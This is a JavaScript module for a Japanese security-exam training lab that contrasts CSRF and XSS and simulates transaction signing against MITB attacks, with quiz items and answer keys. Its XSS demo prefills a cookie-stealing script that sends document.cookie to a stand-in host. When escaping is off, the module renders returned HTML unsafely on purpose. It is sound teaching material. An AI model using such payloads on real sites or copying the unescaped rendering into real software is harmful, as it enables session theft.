/**
 * Module: CSRF vs XSS Comprehensive Comparison Lab
 * 情報処理安全確保支援士対策: CSRF と XSS の徹底比較・トランザクション署名 (MITB対策) 防御実習
 */

window.SecurityLabModules = window.SecurityLabModules || {};

window.SecurityLabModules["csrf_vs_xss"] = {
    html: `
        <div class="lab-container">
            <!-- Navigation Sub-tabs -->
            <div class="tab-container">
                <button class="btn-tab active" id="subtab-matrix">📊 対比マトリックス & 概念図</button>
                <button class="btn-tab" id="subtab-csrf">💣 CSRF 攻撃 & 防衛実験</button>
                <button class="btn-tab" id="subtab-xss">💥 XSS 攻撃 & 防衛実験</button>
                <button class="btn-tab" id="subtab-tx-signing">🔐 トランザクション署名 & MITB/CSRF高度防衛</button>
            </div>

            <!-- TAB 1: Comparison Matrix & Concept -->
            <div id="tab-content-matrix" class="tab-pane active" style="display: block;">
                <div class="card">
                    <h3>⚡ CSRF (クロスサイト・リクエスト・フォージェリ) vs XSS (クロスサイト・スクリプティング) の違い</h3>
                    <p class="card-subtitle">セキスペ試験で最も出題頻度が高い2大Web脆弱性の決定的な違いを整理します。</p>
                    
                    <div style="overflow-x: auto; margin-top: 16px;">
                        <table class="text-base" style="width: 100%; border-collapse: collapse; text-align: left;">
                            <thead>
                                <tr style="background-color: var(--bg-card-header); border-bottom: 2px solid var(--border-color);">
                                    <th style="padding: 12px; border: 1px solid var(--border-color);">比較項目</th>
                                    <th style="padding: 12px; border: 1px solid var(--border-color); color: #f59e0b;">💣 CSRF (Cross-Site Request Forgery)</th>
                                    <th style="padding: 12px; border: 1px solid var(--border-color); color: #ef4444;">💥 XSS (Cross-Site Scripting)</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">攻撃が発動する場所</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); background-color: var(--bg-subtle-warning);">
                                        <b>外部の罠サイト</b> (<code>evil-site.net</code>)<br>
                                        ※ターゲットサイト上の脆弱性は不要
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); background-color: var(--bg-subtle-danger);">
                                        <b>ターゲットサイト内</b> (<code>bank-service.local</code>)<br>
                                        ※入力・出力処理のエスケープ漏れ
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">攻撃の目的・動作</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ログイン中ユーザーの<b>権限を悪用</b>し、意図しないリクエスト（送金・書き込み・パスワード変更など）を送信させる
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        悪意ある<b>JavaScript等のスクリプトを注入</b>し、Cookie奪取、画面改ざん、偽画面誘導を実行させる
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">Cookie (Session ID) の扱い</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ブラウザが<b>自動付与・送信</b>する。<br>
                                        ※SOPがあるため攻撃者はCookieの「中身」を盗み取れない。
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ターゲットサイト上で動作するJSにより、<code>document.cookie</code> で<b>中身を直接盗掘</b>できる（HttpOnly未設定時）。
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">CSRFトークンの有効性</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); color: var(--color-success); font-weight: bold;">
                                        ✅ 極めて有効<br>
                                        (外部罠サイトはSOPによりトークンを取得不能)
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); color: var(--color-danger); font-weight: bold;">
                                        ❌ 無効化される<br>
                                        (XSSがあるとJSでCSRFトークンも取得・添付されてしまう)
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">根本的・推奨対策</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ・抗CSRFトークンの検証<br>
                                        ・SameSite Cookie 属性 (Strict / Lax)<br>
                                        ・<b>トランザクション署名</b> (高度送金防衛)
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ・HTMLエスケープ (サニタイズ)<br>
                                        ・HttpOnly Cookie 属性 (被害軽減)<br>
                                        ・Content Security Policy (CSP)
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="card" style="margin-top: 16px;">
                    <h3>📐 動作概念図: CSRF vs XSS のメカニズム比較</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 12px;">
                        <div class="callout-box callout-warning">
                            <h4 style="color: #d97706; margin-bottom: 8px;">💣 CSRF (外部の罠サイトから攻撃)</h4>
                            <ol class="text-base" style="line-height: 1.6; margin-left: 16px;">
                                <li>ユーザーが <code>bank-service.local</code> にログイン（Cookie保有）。</li>
                                <li>ユーザーが悪意ある外部の罠サイト <code>evil-site.net</code> を訪問。</li>
                                <li>罠サイト内のフォームやJSが <code>bank-service.local/transfer</code> へ強制作成リクエストを送信。</li>
                                <li>ブラウザが自動的に <code>bank-service.local</code> のセッションCookieを添付。</li>
                                <li>銀行サーバーは正規ユーザーからの送信と判断し、不正送金が完了！</li>
                            </ol>
                        </div>
                        <div class="callout-box callout-danger">
                            <h4 style="color: #dc2626; margin-bottom: 8px;">💥 XSS (ターゲットサイト内で攻撃コード実行)</h4>
                            <ol class="text-base" style="line-height: 1.6; margin-left: 16px;">
                                <li>攻撃者が <code>target-bbs.local</code> の掲示板に <code>&lt;script&gt;...&lt;/script&gt;</code> を投稿。</li>
                                <li>被害者ユーザーがその掲示板ページを開く。</li>
                                <li>ターゲットサイトの画面上で悪意あるJavaScriptが直接実行される。</li>
                                <li>JSが <code>document.cookie</code> を取得し、攻撃者サーバーへ送信！</li>
                                <li>さらに画面上のCSRFトークンも取得し、全リクエストを意図通りに偽造！</li>
                            </ol>
                        </div>
                    </div>
                </div>

                <!-- Tab 1 Reference Section -->
                <div class="callout-box callout-neutral text-base" style="margin-top: 16px; border-left: 4px solid var(--color-primary);">
                    <b style="color: var(--text-primary);">🔗 本機能（CSRF vs XSS 概念比較）の関連情報源・具体的な参照記事URL:</b>
                    <ul style="margin: 6px 0 0 18px; padding: 0; line-height: 1.6; color: var(--text-secondary);">
                        <li><b>IPA 情報処理安全確保支援士シラバス (Webセキュリティ)</b>: <a href="https://www.ipa.go.jp/shiken/syllabus/gaiyou.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/shiken/syllabus/gaiyou.html</a></li>
                        <li><b>MDN Web Docs: Same-Origin Policy (同種オリジン制約)</b>: <a href="https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener" style="color: var(--color-primary);">https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy</a></li>
                    </ul>
                </div>
            </div>

            <!-- TAB 2: CSRF Simulation -->
            <div id="tab-content-csrf" class="tab-pane" style="display: none;">
                <div class="card">
                    <h3>💣 CSRF (クロスサイト・リクエスト・フォージェリ) 実験室</h3>
                    <p class="card-subtitle">被害者が外部の罠サイト (<code>evil-site.net</code>) を閲覧した際、ターゲット銀行 (<code>bank-service.local</code>) へ自動で偽リクエストが送信される攻撃と、その防衛をシミュレートします。</p>
                    
                    <div class="lab-grid-2" style="margin-top: 16px;">
                        <div>
                            <h4>⚙️ サーバー側の防衛設定</h4>
                            <div class="form-group" style="margin-top: 12px;">
                                <label for="csrfTokenToggle" style="cursor: pointer; font-weight: bold;">
                                    <input type="checkbox" id="csrfTokenToggle"> 🛡️ 抗CSRFトークン検証を有効化する
                                </label>
                                <span class="text-xs text-muted">※フォーム送信時にサーバー発行のワンタイムトークンの一致を要求します。</span>
                            </div>

                            <div class="form-group" style="margin-top: 12px;">
                                <label for="csrfSameSiteSelect">🛡️ Session Cookie の SameSite 属性設定:</label>
                                <select id="csrfSameSiteSelect" class="jwt-editor" style="height: 38px;">
                                    <option value="None">SameSite=None (クロスサイトリクエストでCookieを常に送信 - 危険)</option>
                                    <option value="Lax" selected>SameSite=Lax (クロスサイトPOSTリクエストでCookieを自動除外 - 推奨・安全)</option>
                                    <option value="Strict">SameSite=Strict (すべてのクロスサイトリクエストでCookieを除外 - 最高度安全)</option>
                                </select>
                            </div>

                            <div style="margin-top: 20px; background-color: var(--bg-card-header); padding: 14px; border-radius: var(--radius-sm); border: 1px solid var(--border-color);">
                                <h5 style="margin-bottom: 6px; color: #f59e0b;">🌐 ユーザーの訪問状況</h5>
                                <p class="text-base text-muted" style="line-height: 1.5;">
                                    ログイン状態: <b>ログイン済み (user_alice)</b><br>
                                    保有Cookie: <code>session_id=user_alice_sess_777</code><br>
                                    閲覧中ページ: <code style="color: #ef4444;">http://evil-site.net/win-prize.html</code> (罠サイト)
                                </p>
                            </div>

                            <button class="btn btn-primary text-md" id="btnExecuteCsrf" style="margin-top: 16px; width: 100%;">
                                🎯 罠サイト上の「懸賞に応募する」ボタンをクリック (偽リクエスト送信)
                            </button>
                        </div>

                        <div>
                            <h4>📡 サーバー受信レスポンス & パケットログ</h4>
                            <div class="form-group">
                                <label>リクエストヘッダー解析:</label>
                                <div class="response-box text-sm" style="background-color: #0c0a09; min-height: 90px;">
                                    <code id="csrfHeadersText" style="color: #93c5fd;">リクエスト未送信</code>
                                </div>
                            </div>

                            <div class="form-group">
                                <label>処理結果メッセージ:</label>
                                <div class="response-box" id="csrfResultBox" style="min-height: 100px;">
                                    <div id="csrfResultStatus" class="text-base text-muted" style="font-weight: bold;">
                                        ボタンを押してシミュレーションを実行してください。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- TAB 3: XSS Simulation -->
            <div id="tab-content-xss" class="tab-pane" style="display: none;">
                <div class="card">
                    <h3>💥 XSS (クロスサイト・スクリプティング) & Cookie奪取・CSRF無効化 実験室</h3>
                    <p class="card-subtitle">ターゲットサイト (<code>target-bbs.local</code>) の掲示板にスクリプトを注入し、Cookie奪取やCSRFトークンの無効化が発生するプロセスと、HTMLエスケープ / HttpOnly による防御を体験します。</p>

                    <div class="lab-grid-2" style="margin-top: 16px;">
                        <div>
                            <h4>⚙️ サーバー側の防衛設定</h4>
                            <div class="form-group" style="margin-top: 12px;">
                                <label for="xssEscapeToggle" style="cursor: pointer; font-weight: bold; color: var(--color-success);">
                                    <input type="checkbox" id="xssEscapeToggle"> 🛡️ HTMLエスケープ (サニタイズ) を適用する (根本対策)
                                </label>
                            </div>

                            <div class="form-group" style="margin-top: 8px;">
                                <label for="xssHttpOnlyToggle" style="cursor: pointer; font-weight: bold; color: #3b82f6;">
                                    <input type="checkbox" id="xssHttpOnlyToggle"> 🛡️ Session Cookie に HttpOnly 属性を付与する (被害軽減策)
                                </label>
                                <span class="text-xs text-muted">※JS (document.cookie) からのCookie読み取りを禁止します。</span>
                            </div>

                            <div class="form-group" style="margin-top: 16px;">
                                <label for="xssPayloadInput">掲示板への投稿内容 (ペイロード):</label>
                                <textarea id="xssPayloadInput" class="jwt-editor text-base" style="height: 90px;" placeholder="投稿内容を入力...">こんにちは！ <script>fetch('http://evil.net/steal?cookie='+document.cookie)</script> です。</textarea>
                            </div>

                            <button class="btn btn-primary" id="btnExecuteXss" style="margin-top: 10px; width: 100%;">
                                📝 掲示板に投稿する (HTMLレンダリング)
                            </button>
                        </div>

                        <div>
                            <h4>🖥️ ブラウザ表示画面 & セキュリティ分析</h4>
                            <div class="form-group">
                                <label>掲示板のレンダリング結果:</label>
                                <div style="background-color: white; color: black; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 14px; min-height: 80px; font-family: sans-serif;" id="xssRenderArea">
                                    <span style="color: #64748b; font-style: italic;">投稿内容がここに表示されます。</span>
                                </div>
                            </div>

                            <div class="form-group">
                                <label>実行結果と診断:</label>
                                <div class="response-box" id="xssResultBox" style="min-height: 110px;">
                                    <div id="xssResultStatus" class="text-base text-muted">
                                        投稿ボタンを押して結果を確認してください。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- TAB 4: Transaction Signing & MITB / CSRF Defense (NEW) -->
            <div id="tab-content-tx-signing" class="tab-pane" style="display: none;">
                <div class="card" style="margin-bottom: 20px;">
                    <h3>🔐 トランザクション署名 ＆ MITB / CSRF 高度送金防衛</h3>
                    <p class="card-subtitle">
                        情報処理安全確保支援士 <strong>令和5年秋期 午前Ⅱ 問7</strong> の出題テーマです。<br>
                        ブラウザ内のマルウェア（MITB攻撃）やCSRF攻撃による「送金先口座・金額の勝手な改ざん」を防ぐため、送金パラメータに紐付いたワンタイム署名を別デバイス（Out-of-Band）で生成・検証する強力な防衛メカニズムを体験します。
                    </p>

                    <!-- Interactive Transaction Signing Simulator -->
                    <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 20px; margin-top: 16px;">
                        <h4 class="text-md text-primary-color" style="margin-top: 0;">💸 送金手続き ＆ デバイス間トランザクション署名シミュレータ</h4>
                        
                        <div class="lab-grid-2" style="gap: 20px; margin-top: 14px;">
                            <!-- Left Device: PC Browser / Bank Screen -->
                            <div style="background: var(--bg-panel); border: 1px solid var(--color-primary); border-radius: 8px; padding: 16px;">
                                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; margin-bottom: 12px;">
                                    <span class="text-base text-primary-color" style="font-weight: bold;">💻 ① PCブラウザ（ネットバンキング画面）</span>
                                    <span class="text-xs subtab-badge badge-subtle-primary">Out-of-Band 前提</span>
                                </div>

                                <div class="form-group" style="margin-bottom: 10px;">
                                    <label class="text-xs text-muted">振込先口座番号 (ユーザー入力):</label>
                                    <input type="text" id="txAccNum" class="text-base" value="123-4567" style="width: 100%; padding: 6px; border-radius: 4px;">
                                </div>

                                <div class="form-group" style="margin-bottom: 12px;">
                                    <label class="text-xs text-muted">送金額 (円):</label>
                                    <input type="number" id="txAmount" class="text-base" value="500000" style="width: 100%; padding: 6px; border-radius: 4px;">
                                </div>

                                <!-- Attack Mode Toggle -->
                                <div class="callout-box callout-danger" style="border-style: dashed; padding: 10px; margin-bottom: 12px;">
                                    <label for="txMitbToggle" class="text-xs text-danger-color" style="cursor: pointer; font-weight: bold;">
                                        <input type="checkbox" id="txMitbToggle"> ⚠️ MITB攻撃 / CSRF攻撃を有効化
                                    </label>
                                     <div class="text-xs text-danger-color" style="margin-top: 4px; line-height: 1.4;">
                                        ※チェックを入れると、送信時にブラウザ内のマルウェア/CSRFが振込先口座を『999-9999 (攻撃者の口座)』へ自動改ざんします。
                                    </div>
                                </div>

                                <!-- Auth Type Choice -->
                                <div class="form-group" style="margin-bottom: 14px;">
                                    <label class="text-xs text-muted">使用する認証方式:</label>
                                    <select id="txAuthType" class="text-xs" style="width: 100%; padding: 6px; border-radius: 4px;">
                                        <option value="otp">通常のOTP (ログイン時/共通ワンタイムパスワード)</option>
                                        <option value="transaction_signing" selected>トランザクション署名 (取引データ紐付け型署名)</option>
                                    </select>
                                </div>

                                <button class="btn btn-primary text-base" id="btnSendTransaction" style="width: 100%; font-weight: bold;">
                                    💸 送金リクエストを確定・送信
                                </button>
                            </div>

                            <!-- Right Device: Separate Hardware Token / Smartphone (Out of Band) -->
                            <div style="background: var(--bg-panel); border: 1px solid var(--color-success); border-radius: 8px; padding: 16px;">
                                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #065f46; padding-bottom: 8px; margin-bottom: 12px;">
                                    <span class="text-base" style="font-weight: bold; color: #a7f3d0;">📱 ② 独立端末 (ハードウェアトークン / スマホ)</span>
                                    <span class="text-xs subtab-badge badge-subtle-success">Out-of-Band</span>
                                </div>

                                <p class="text-xs" style="color: #94a3b8; line-height: 1.5; margin-bottom: 10px;">
                                    <strong>トランザクション署名デバイスの動作:</strong><br>
                                    PC画面とは独立したこの端末に「振込先口座」を入力・確認すると、取引データと秘密鍵から『この取引専用のワンタイム署名』が算出されます。
                                </p>

                                <div class="form-group" style="margin-bottom: 10px;">
                                    <label class="text-xs" style="color: #a7f3d0;">端末で確認した振込先口座:</label>
                                    <input type="text" id="txTokenAcc" class="text-xs" value="123-4567" readonly style="width: 100%; padding: 6px; background: #064e3b; color: #34d399; border: 1px solid #10b981; border-radius: 4px;">
                                </div>

                                <div class="form-group" style="margin-bottom: 12px;">
                                    <label class="text-xs" style="color: #a7f3d0;">算出されたトランザクション署名コード:</label>
                                    <div class="text-lg text-mono" style="font-weight: bold; color: #34d399; background: #022c22; padding: 8px; text-align: center; border-radius: 4px; border: 1px solid #059669;" id="txGeneratedSig">
                                        TX-SIG-1234567-500000
                                    </div>
                                </div>

                                <div class="text-xs" style="color: #94a3b8; line-height: 1.4;">
                                    💡 攻撃者がリクエスト内の口座を改ざんしても、この端末で生成された署名は『123-4567』に固定されているため、銀行サーバ側でハッシュが不一致となりブロックされます！
                                </div>
                            </div>
                        </div>

                        <!-- Output & Server Log Box -->
                        <div style="margin-top: 16px;">
                            <label class="text-xs" style="font-weight: bold; color: var(--text-primary);">📡 銀行システム 処理ログ ＆ 判定結果:</label>
                            <div class="response-box" id="txResultBox" style="background-color: var(--bg-terminal); min-height: 90px; margin-top: 6px; padding: 12px;">
                                <div id="txResultStatus" class="text-xs" style="color: #94a3b8;">
                                    「送金リクエストを確定・送信」ボタンを押すと、銀行サーバでの検証ログが表示されます。
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Comparison Table: OTP vs Transaction Signing -->
                    <div style="margin-top: 24px;">
                        <h4 class="text-md" style="margin-bottom: 10px;">📊 通常のOTP と トランザクション署名 の決定的な違い</h4>
                        <div style="overflow-x: auto;">
                            <table class="text-sm" style="width: 100%; border-collapse: collapse; text-align: left;">
                                <thead>
                                    <tr class="table-row-header">
                                        <th style="padding: 10px; border: 1px solid var(--border-color);">比較項目</th>
                                        <th style="padding: 10px; border: 1px solid var(--border-color); color: #f59e0b;">🔑 通常のワンタイムパスワード (OTP)</th>
                                        <th style="padding: 10px; border: 1px solid var(--border-color); color: #60a5fa;">🔐 トランザクション署名</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">値の算出根拠</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color);">時刻 (TOTP) や カウンタ (HOTP) のみ</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); color: #93c5fd; font-weight: bold;">時刻/カウンタ ＋ <b>取引データ (振込先口座番号・金額など)</b></td>
                                    </tr>
                                    <tr>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">MITB攻撃 (データ書き換え) 対策</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); color: #f87171; font-weight: bold;">❌ 無効 (口座を書き換えられてもOTPが通る)</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); color: #34d399; font-weight: bold;">✅ 完全防御 (取引データ不一致により拒否)</td>
                                    </tr>
                                    <tr>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">CSRF攻撃による強制送金 対策</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color);">⚠️ OTP入力画面を出せば防げるが使い回し時に脆弱</td>
                                        <td style="padding: 10px; border: 1px solid var(--border-color); color: #34d399; font-weight: bold;">✅ 完全防御 (意図しない振込先への署名生成が不可能)</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            </div>
        </div>
    `,

    quiz: [
        {
            id: "qR5Aki7",
            year: "令和5年秋期 午前Ⅱ 問7 (トランザクション署名)",
            question: "インターネットバンキングでのMITB攻撃による不正送金について，対策として用いられるトランザクション署名の説明はどれか。",
            options: [
                { key: "A", label: "ア", text: "携帯端末からの送金取引の場合，金融機関から利用者の登録メールアドレスに送金用のワンタイムパスワードを送信する。" },
                { key: "I", label: "イ", text: "特定認証業務の認定を受けた認証局が署名したデジタル証明書をインターネットバンキングでの利用者認証に用いることによって，ログインパスワードが漏えいした際の不正ログインを防止する。" },
                { key: "U", label: "ウ", text: "利用者が送金取引時に，\"送金操作を行うPCとは別のデバイスに振込先口座番号などの取引情報を入力して表示された値\"をインターネットバンキングに送信する。" },
                { key: "E", label: "エ", text: "ログイン時に，送金操作を行うPCとは別のデバイスによって，一定時間だけ有効なログイン用のワンタイムパスワードを算出し，インターネットバンキングに送信する。" }
            ],
            answer: "U",
            explanation: "トランザクション署名とは、送金時にPCとは別の安全なデバイス（ハードウェアトークンやスマホアプリ等）に振込先口座や金額を入力し、その取引データから生成された署名値を送信して認証する仕組みです。PCがMITB攻撃（マルウェアによるブラウザ内データ改ざん）を受けても、別デバイスで確認した正しい取引データとの不一致により改ざんを確実に検知・遮断できます。",
            point: "「取引データ（振込先・金額）を入力して値を算出する」＝トランザクション署名（MITB攻撃の根本対策）。通常のOTP（時刻やカウンタのみから算出）との決定的な違いが出題されます。"
        },
        {
            id: "csrf_q1",
            year: "セキスペ頻出 (攻撃識別)",
            question: "被害者が攻撃者の開設した外部Webページを閲覧した際、被害者のブラウザからターゲットECサイトへ商品購入リクエストが自動送信された。この攻撃手法はどれか？",
            options: [
                { key: "A", label: "ア", text: "XSS (クロスサイトスクリプティング)" },
                { key: "I", label: "イ", text: "CSRF (クロスサイトリクエストフォージェリ)" },
                { key: "U", label: "ウ", text: "SQLインジェクション" },
                { key: "E", label: "エ", text: "セッションハイジャック" }
            ],
            answer: "I",
            explanation: "攻撃者の外部ページから、被害者のブラウザ（ログイン中セッションCookie）を利用してターゲットサイトへ意図しないリクエストを送信させる攻撃は<strong>CSRF (クロスサイトリクエストフォージェリ)</strong> です。",
            point: "「外部の罠サイトを踏ませて、正規ユーザーの権限で勝手に操作させる」＝CSRF。"
        },
        {
            id: "csrf_q2",
            year: "セキスペ頻出 (XSS対策)",
            question: "Webサイトの掲示板の投稿欄にスクリプトが注入され、他の利用者がその投稿を表示した際にCookieが奪取された。この防御策として最も適切なものはどれか？",
            options: [
                { key: "A", label: "ア", text: "フォームに抗CSRFトークンを埋め込む" },
                { key: "I", label: "イ", text: "Cookie に SameSite=Lax 属性を付与する" },
                { key: "U", label: "ウ", text: "出力時に < や > を &lt; や &gt; にHTMLエスケープ（サニタイズ）する" },
                { key: "E", label: "エ", text: "プレースホルダ（バインド変数）を使用する" }
            ],
            answer: "U",
            explanation: "XSSの根本的対策は、ユーザーからの入力を画面に出力する全ての箇所で<strong>HTMLエスケープ（サニタイズ）</strong>することです。また、CookieからのセッションID窃取を防ぐために<strong>HttpOnly属性</strong>の付与が有効です。",
            point: "XSSの根本対策＝出力時のHTMLエスケープ。CSRFの根本対策＝ワンタイムトークン / SameSite属性。"
        }
    ],

    references: [
        { source: "IPA 独立行政法人 情報処理推進機構", title: "令和5年秋期 午前Ⅱ 問7 過去問解説（トランザクション署名）", url: "https://www.sc-siken.com/kakomon/05_aki/am2_7.html" },
        { source: "IPA 独立行政法人 情報処理推進機構", title: "安全なウェブサイトの作り方 (CSRF対策 / XSS対策)", url: "https://www.ipa.go.jp/security/vuln/websecurity.html" },
        { source: "OWASP", title: "Out-of-Band Authentication & Transaction Signing Guidelines", url: "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html" },
        { source: "FISC (金融情報システムセンター)", title: "金融機関等におけるサイバーセキュリティ対策ガイドライン (トランザクション署名指針)", url: "https://www.fisc.or.jp/" },
        { source: "MDN Web Docs", title: "Same-Origin Policy (同一オリジンポリシー)", url: "https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy" }
    ],

    init: function () {
        this.bindEvents();
    },

    bindEvents: function () {
        const self = this;

        // Subtab Switcher
        if (window.UIComponents && window.UIComponents.setupSubTabs) {
            window.UIComponents.setupSubTabs([
                { btnId: "subtab-matrix", panelId: "tab-content-matrix" },
                { btnId: "subtab-csrf", panelId: "tab-content-csrf" },
                { btnId: "subtab-xss", panelId: "tab-content-xss" },
                { btnId: "subtab-tx-signing", panelId: "tab-content-tx-signing" }
            ]);
        }

        // CSRF Simulation Button
        const btnCsrf = document.getElementById("btnExecuteCsrf");
        if (btnCsrf) {
            btnCsrf.addEventListener("click", function () {
                self.runCsrfSimulation();
            });
        }

        // XSS Simulation Button
        const btnXss = document.getElementById("btnExecuteXss");
        if (btnXss) {
            btnXss.addEventListener("click", function () {
                self.runXssSimulation();
            });
        }

        // Transaction Signing Simulation Handler
        const txAccNum = document.getElementById("txAccNum");
        const txTokenAcc = document.getElementById("txTokenAcc");
        const txGeneratedSig = document.getElementById("txGeneratedSig");
        const txAmount = document.getElementById("txAmount");

        if (txAccNum && txTokenAcc && txGeneratedSig) {
            const updateSignature = () => {
                const acc = txAccNum.value || "123-4567";
                const amt = txAmount.value || "500000";
                txTokenAcc.value = acc;
                txGeneratedSig.textContent = `TX-SIG-${acc.replace("-", "")}-${amt}`;
            };
            txAccNum.addEventListener("input", updateSignature);
            txAmount.addEventListener("input", updateSignature);
        }

        const btnSendTx = document.getElementById("btnSendTransaction");
        if (btnSendTx) {
            btnSendTx.addEventListener("click", function () {
                self.runTransactionSigningSimulation();
            });
        }
    },


    runCsrfSimulation: async function () {
        const tokenEnabled = document.getElementById("csrfTokenToggle")?.checked || false;
        const sameSiteVal = document.getElementById("csrfSameSiteSelect")?.value || "None";

        try {
            const response = await fetch("/api/vuln/csrf-vs-xss/simulate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    mode: "csrf",
                    csrf_token_enabled: tokenEnabled,
                    provided_csrf_token: tokenEnabled ? "invalid_token_from_evil_site" : "",
                    samesite_attribute: sameSiteVal
                })
            });

            const data = await response.json();

            // Render headers
            const headersBox = document.getElementById("csrfHeadersText");
            if (headersBox && data.http_headers) {
                headersBox.textContent = JSON.stringify(data.http_headers, null, 2);
            }

            // Render status
            const statusBox = document.getElementById("csrfResultStatus");
            if (statusBox) {
                if (data.success) {
                    statusBox.innerHTML = `<span style="color: #ef4444;">${data.message}</span>`;
                } else {
                    statusBox.innerHTML = `<span style="color: #10b981;">${data.message}</span>`;
                }
            }

            if (window.app) {
                window.app.log("network", `[CSRF Sim] Origin: ${data.request_origin} -> Target: ${data.target_origin} | Status: ${data.status_code}`);
            }
        } catch (err) {
            console.error("CSRF simulation error:", err);
        }
    },

    runXssSimulation: async function () {
        const escapeEnabled = document.getElementById("xssEscapeToggle")?.checked || false;
        const httpOnlyEnabled = document.getElementById("xssHttpOnlyToggle")?.checked || false;
        const payload = document.getElementById("xssPayloadInput")?.value || "";

        try {
            const response = await fetch("/api/vuln/csrf-vs-xss/simulate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    mode: "xss",
                    payload: payload,
                    escape_html_enabled: escapeEnabled,
                    httponly_enabled: httpOnlyEnabled
                })
            });

            const data = await response.json();

            // Render Browser Output Area
            const renderArea = document.getElementById("xssRenderArea");
            if (renderArea) {
                if (escapeEnabled) {
                    renderArea.textContent = data.rendered_html;
                } else {
                    renderArea.innerHTML = data.rendered_html;
                }
            }

            // Render Status
            const statusBox = document.getElementById("xssResultStatus");
            if (statusBox) {
                if (data.success) {
                    statusBox.innerHTML = `<span style="color: #ef4444;">${data.message}</span>`;
                } else if (data.blocked_by === "HttpOnly (Partial)") {
                    statusBox.innerHTML = `<span style="color: #f59e0b;">${data.message}</span>`;
                } else {
                    statusBox.innerHTML = `<span style="color: #10b981;">${data.message}</span>`;
                }
            }

            if (window.app) {
                window.app.log("network", `[XSS Sim] Escape: ${escapeEnabled} | HttpOnly: ${httpOnlyEnabled} | Result: ${data.message.substring(0, 40)}...`);
            }
        } catch (err) {
            console.error("XSS simulation error:", err);
        }
    },

    runTransactionSigningSimulation: async function () {
        const accNum = document.getElementById("txAccNum")?.value || "123-4567";
        const amount = parseInt(document.getElementById("txAmount")?.value || "500000", 10);
        const mitbAttack = document.getElementById("txMitbToggle")?.checked || false;
        const authType = document.getElementById("txAuthType")?.value || "transaction_signing";

        try {
            const response = await fetch("/api/vuln/csrf-vs-xss/simulate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    mode: "transaction_signing",
                    account_number: accNum,
                    amount: amount,
                    signed_account: accNum,
                    auth_type: authType,
                    mitb_attack: mitbAttack
                })
            });

            const data = await response.json();

            const statusBox = document.getElementById("txResultStatus");
            if (statusBox) {
                let badge = data.success ? "🚨 【被害発生】" : "🛡️ 【防衛成功】";
                let color = data.success ? "#ef4444" : "#10b981";
                statusBox.innerHTML = `
                    <div class="text-base" style="font-weight: bold; color: ${color}; margin-bottom: 4px;">${badge} ${data.message}</div>
                    <div class="text-xs" style="color: #cbd5e1; margin-top: 4px;">
                        送信先口座: <b>${data.account_number}</b> | 送金額: <b>${data.amount.toLocaleString()}円</b> | 認証方式: <b>${data.auth_type}</b>
                    </div>
                `;
            }

            if (window.app) {
                window.app.log("network", `[TxSigning Sim] Auth: ${authType} | MITB Attack: ${mitbAttack} | Result: ${data.message.substring(0, 35)}...`);
            }
        } catch (err) {
            console.error("Transaction signing simulation error:", err);
        }
    }
};
